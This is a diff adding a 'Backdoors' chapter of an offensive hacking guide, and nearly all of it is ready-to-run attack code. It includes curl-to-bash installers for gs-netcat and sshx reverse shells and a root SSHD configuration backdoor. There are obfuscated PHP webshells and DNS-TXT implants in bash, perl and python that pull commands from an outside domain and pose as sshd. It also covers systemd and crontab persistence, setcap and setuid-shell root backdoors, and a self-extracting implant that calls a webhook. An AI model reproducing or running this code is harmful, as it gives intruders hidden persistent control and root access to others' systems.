@@ -1,0 +1,268 @@
+Backdoors
+
+See Reverse Shell / Dumb Shell for simple 1-liner reverse shells.
+
+6.i. Reverse shell using gs-netcat
+
+Mostly we use gs-netcat's automated deployment script: https://www.gsocket.io/deploy.
+
+bash -c "$(curl -fsSLk https://gsocket.io/y)"
+
+or
+
+bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/y)"
+
+or deploy gsocket by running your own deployment server:
+
+LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/ys)"  # Notice '/ys' instead of '/y'
+
+6.ii. Reverse shell with sshx.io (encrypted)
+
+Access a remote shell from your web browser https://sshx.io.
+
+Pipe be sshx-backdoor directly into memory:
+
+echo $(curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null \
+ |nohup perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3",("-q")' 2>/dev/null \
+ |{ read x;echo "$x";}&)
+
+Or the lame way:
+
+curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null >.s \
+&& chmod 755 .s \
+&& (PATH=.:$PATH .s -q >.u 2>/dev/null &);
+for _ in {1..10}; do [ -s .u ] && break;sleep 1;done;cat .u;rm -f .u .s;
+
+6.iii. Smallest SSHD backdoor
+
+    Survives apt update
+    Does not create any new file.
+    Does not use authorized_keys or PAM.
+
+Adding your key to authorized_keys is overused 😩. Instead, as root, cut & paste this once on any target. It will add a single line to SSHD's config and allow you to log in forever:
+
+backdoor_sshd() {
+	local B="/etc/ssh"
+	local K="${B}/ssh_host_ed25519_key" D="${B}/sshd_config.d"
+	local N=$(cd "${D}" || exit; shopt -s nullglob; echo *.conf)
+	[ -n "$N" ] && N="${N%%\.conf*}.conf"
+	N="${D}/${N:-50-cloud-init.conf}"
+	{ [ ! -f "$K" ] || [ ! -f "$K".pub ]; } && return
+	grep -iqm1 '^PermitRootLogin\s\+no' "${B}/sshd_config" && echo >&2 "WARN: PermitRootLogin blocking in sshd_config"
+	echo -e "\e[0;31mYour id_ed25519 to log in to this server as any user:\e[0;33m\n$(cat "${K}")\e[0m"
+	grep -qm1 '^AuthorizedKeysFile' "$N" && { echo >&2 "WARN: Already backdoored"; return; }
+	echo -e "AuthorizedKeysFile\t.ssh/authorized_keys .ssh/authorized_keys2 ${K}.pub" >>"${N}" || return
+	touch -r "$K" "$N" "$D" \
+	&& declare -f ctime >/dev/null && ctime "$N" "$D"
+	systemctl restart ssh
+}
+backdoor_sshd
+
+How it works:
+
+    The SSHD host key is just an ordinary ed25519 key.
+    Any ed25519 key can be used to authenticate a user.
+    SSHD checks ~/.ssh/authorized_keys (but this trick has been overused).
+    Instead, configure SSHD to also check /etc/ssh/sshd_host_ed25519_key.pub for login-authentication-keys.
+    SSHD will now check ~/.ssh/authorized_keys and /etc/ssh/ssh_host_ed25519_key.pub for valid login keys.
+    Use the /etc/ssh/sshd_host_ed25519_key secret key to log in to the target.
+
+6.vi. Remote Access to an entire network
+
+Install gs-netcat. It creates a SOCKS exit-node on the Host's private LAN which is accessible through the Global Socket Relay Network without the need to run your own relay-server (e.g. access the remote private LAN directly from your workstation):
+
+gs-netcat -l -S       # compromised Host
+
+Now from your workstation you can connect to ANY host on the Host's private LAN:
+
+gs-netcat -p 1080    # Your workstation.
+
+# Access route.local:22 on the Host's private LAN from your Workstation:
+socat -  "SOCKS4a:127.1:route.local:22"
+
+Read Use any tool via Socks Proxy.
+
+Other methods:
+
+    Gost/Cloudflared - our very own article
+    Reverse Wireguard - from segfault.net to any (internal) network.
+
+6.v. Smallest PHP Backdoor
+
+Add this line at the beginning of any PHP file:
+
+<?php $i=base64_decode("aWYoaXNzZXQoJF9QT1NUWzBdKSl7c3lzdGVtKCRfUE9TVFswXSk7ZGllO30K");eval($i);?>
+
+It is base64 encoding of:
+
+if(isset($_POST[0])){system($_POST[0]);die;}
+
+Test the backdoor:
+
+### 1. Optional: Start a test PHP server
+cd /var/www/html && php -S 127.0.0.1:8080
+### Without executing a command
+curl http://127.0.0.1:8080/test.php
+### With executing a command
+curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
+
+Sometimes system() is prohibited. Add eval() to allow remote PHP-code execution as a backup. Hide within other base64-comments for some obfuscation:
+
+<?PHP /*1rUY9TDs2wG8In1HkSQzqViVtX2nGidgu/RkzKNJbfho9NqtfTaww4GcR6bIGU+U1AJq
+USOIjliQm4T/9HP6YS6IMhwoZzmr2iydbwDcVynDqtLjI5i7owLKmjbKnijTszoXP/dif9ZcbhtJ
+WQKmhCno0boYQQ2rjHgW3su1C7pYREPSdrYD/4QBpptJU7Djnm5zuyD2TXNjHXm/ZYUW+n4s3PM7
+aWqzWzy*/if(isset($_POST[0])){eval($_POST[1]?:"");system($_POST[0]);die;}/*P
+0KKBW1rvtqxOK8L9Ok6y7Rulkl2um62KVxvVx/+kODDw4HZV5Yx/HK/7lG+X/IkK8LViCIuaedXl
+HM1wHBlDluhe8BN6pH33fn0bfFpjCDaKrKwK3QF6ExJu1JgKK9deyWUTcqbr0dhe7ZliOIldh3of
++4qUjhVdK4SoeND/Dd+iwRAbhZKxaHfng4ADqdWrwjUPoyTjzOp6C3iDzunviiG0RC3iDuCY*/?>
+
+Trigger with any of these to execute comand or PHP code:
+
+# Execute just command
+curl http://127.0.0.1:8080/x.php -d0='id'
+# Execute just PHP code
+curl http://127.0.0.1:8080/x.php -d0='' -d1='echo file_get_contents("/etc/hosts");'
+
+6.vi. Smallest reverse DNS-tunnel Backdoor
+...in PHP:
+
+Execute arbitrary commands on a server that is not accessible from the public Internet by using a reverse DNS trigger.
+
+Add this line (the implant) at the beginning of any PHP file:
+
+<?PHP eval(base64_decode(dns_get_record("b00m.team-teso.net", DNS_TXT)[0]['txt'])); ?>
+
+The implant requests the payload via a DNS TXT-request from the domain b00m.team-teso.net. When triggered, it creates /tmp/.b00m and notifies THC (via an app.interactsh.com callback). Please use your own domain and also create your own payload. Example:
+
+echo -n '@system("{ id; date;}>/tmp/.b00m 2>/dev/null");' |base64 -w0
+
+    The DNS TXT payload is limited to 2,048 characters (sometimes 65,535 characters).
+    The implant is a bootloader. Use a while loop to download and execute larger paypload via DNS.
+    Check out our favorite places to register a domain anonymously. Cloudflare's Free-Tier is a good start.
+
+...in BASH:
+
+Add this implant to the target's ~/.bashrc or the crontab (demo-paypload):
+
+# Use a "double bash" to redirect _also_ errors from $()-subshell to /dev/null:
+bash -c 'exec bash -c "{ $(dig +short b00m2.team-teso.net TXT|tr -d \ \"|base64 -d);}"'&>/dev/null
+
+or change the demo-payload for an elaborate payload:
+
+    Starts a background daemon to poll every hour for command execution.
+    Depends on bash, dig and base64 only.
+    Hides as sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+    Example uses b00m2.team-teso.net again and creates /tmp/.b00m every hour.
+
+Cut & Paste the following into the target's shell to generate the 1-line implant:
+
+# If dig does not exists then replace /dig +short.../ with
+# /nslookup -q=txt '"$D"'|grep -Fm1 "text ="|sed -E "s|.*text = (.*)|\1|g;s|[\" ]||g"|base64 -d|bash/
+# or use the Perl example below.
+base64 -w0 >x.txt <<-'EOF'
+D=b00m2.team-teso.net
+P="sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
+M=/dev/shm/.cache${UID}
+[ -f $M ]&&exit
+touch $M
+(echo 'slp(){ local IFS;[ -n "${_sfd:-}" ]||exec {_sfd}<> <(:);read -t$1 -u$_sfd||:;}
+slp 1
+while :; do
+	dig +short '"$D"' TXT|tr -d \ \"|base64 -d|bash
+	slp 3600
+done'|exec -a "$P" bash &) &>/dev/null
+EOF
+echo "===> Add the following to the target's ~/.bashrc or cronjob:"$'\n\033[0;36m'"echo $(<x.txt)|base64 -d|bash"$'\033[0m'
+rm -f x.txt
+
+Add the 1-line result of the script to any startup script on the target (use crontab, ~/.bashrc, udev or ExecStartPre=). Here is a clever example for /usr/lib/systemd/system/ssh.service (with some additional obfuscation):
+
+...
+[Service]
+EnvironmentFile=-/etc/default/ssh
+Environment="SSHD=echo RD1iMDBtMi50ZWFtLXRlc28ubmV0ClA9InNzaGQ6IC91c3Ivc2Jpbi9zc2hkIC1EIFtsaXN0ZW5lcl0gMCBvZiAxMC0xMDAgc3RhcnR1cHMiCk09L2Rldi9zaG0vLmNhY2hlJHtVSUR9ClsgLWYgJE0gXSYmZXhpdAp0b3VjaCAkTQooZWNobyAnc2xwKCl7IGxvY2FsIElGUztbIC1uICIke19zZmQ6LX0iIF18fGV4ZWMge19zZmR9PD4gPCg6KTtyZWFkIC10JDEgLXUkX3NmZHx8Ojt9CnNscCAxCndoaWxlIDo7IGRvCmRpZyArc2hvcnQgJyIkRCInIFRYVHx0ciAtZCBcIFwifGJhc2U2NCAtZHxiYXNoCnNscCAzNjAwCmRvbmUnfGV4ZWMgLWEgIiRQIiBiYXNoICYpICY+L2Rldi9udWxsCg==|base64 -d|bash"
+ExecStartPre=-bash -c 'eval $SSHD'
+ExecStartPre=/usr/sbin/sshd -t
+ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
+...
+
+...in PERL:
+
+The same but only needing perl + bash (not dig):
+
+perl -MMIME::Base64 -e '$/=undef;print encode_base64(<>,"")' >x.txt <<-'EOF'
+D=b00m2.team-teso.net
+P="sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
+M=/dev/shm/.cache-1-${UID}
+(echo 'use Net::DNS;use MIME::Base64;exit(0) if -e "'"$M"'";close(open($f,">","'"$M"'"));for (;;) { system decode_base64((Net::DNS::Resolver->new->query(q/'"$D"'/,q/TXT/)->answer)[0]->txtdata=~y/ \\//dr);sleep(3600)}'|exec -a "$P" perl &) &>/dev/null
+EOF
+echo "===> Execute the following on the target:"$'\n\033[0;36m'"perl -MMIME::Base64 -e'print decode_base64(\"$(<x.txt)\")'|bash"$'\033[0m'
+rm -f x.txt
+
+(thank you to LouCipher for a perl verison)
+...in PYTHON:
+
+Cut & paste the following into your shell:
+
+pydnsbackdoorgen() {
+    local str
+    echo -e "This is the TXT record for ${1:?}\e[0;33m"
+    base64 -w0 <"${2:?}"
+    str="$(echo -en 'import dns.resolver\nexec(base64.b64decode("".join([d.to_text() for d in dns.resolver.resolve("'"${1:?}"'", "TXT").rrset])))' | base64 -w 0)"
+    echo -e "\e[0m\nAdd this implant string to a target's python script:\e[0;32m"
+    echo "exec('"'try:\n\timport base64\n\texec(base64.b64decode("'"${str}"'"))\nexcept:\n\tpass'"')"
+    echo -e "\e[0m"
+}
+
+Generate your payload (egg.py will get executed on the target):
+
+cat >egg.py<<-'EOF'
+import time
+dns.resolver.resolve(f"{int(time.time())}.yzlespkpfkqfrtwgvhngkyqbuod49rgmo.oast.fun")
+EOF
+
+Generate your implant (and follow the instructions):
+
+pydnsbackdoorgen b00mpy.team-teso.net egg.py
+
+6.vii. Local Root Backdoor
+1. Backdooring the dynamic loader with setcap
+
+### Execute as ROOT user
+fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
+setcap cap_setuid,cap_setgid+ep "${fn}"
+
+### Execute as non-root user to get root
+fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
+p="$(command -v python3 2>/dev/null)" || p="$(command -v python)"
+"${fn:?}" "$p" -c 'import os;os.setuid(0);os.setgid(0);os.execlp("bash", "kdaemon")'
+
+2. Good old b00m shell
+
+{ cp /bin/sh /var/tmp/.b00m; chmod 6775 /var/tmp/.b00m; } 2>/dev/null >/dev/null
+
+exec /var/tmp/.b00m -p -c 'exec python -c "import os;os.setuid(0);os.execlp(\"bash\", \"kdaemon\")"'
+
+6.viii. Self-Extracting implant
+
+Create a self-extracting shell-script using mkegg.sh (see source for examples).
+
+Simple example:
+
+# Create implant 'egg.sh' containing the file 'foo'
+# and the directory 'warez'. When executing 'egg.sh' then
+# extract 'foo' and 'warez' and call 'warez/run/sh'
+./mkegg.sh egg.sh foo warez warez/run.sh
+
+Real world examples are best:
+
+    Create an implant that installs gsocket and calls our webhook on success:
+
+./mkegg.sh egg.sh deploy-all.sh '(GS_WEBHOOK_KEY=e90d4b38-8285-490d-b5ab-a6d5c7c990a7 deploy-all.sh 2>/dev/null >/dev/null &)'
+# On the target system do: 'cat egg.sh | bash' or './egg.sh'
+
+    Rename egg.sh to update-for-fools.txt and upload as blob to Signal's GitHub repository.
+
+    
+
+
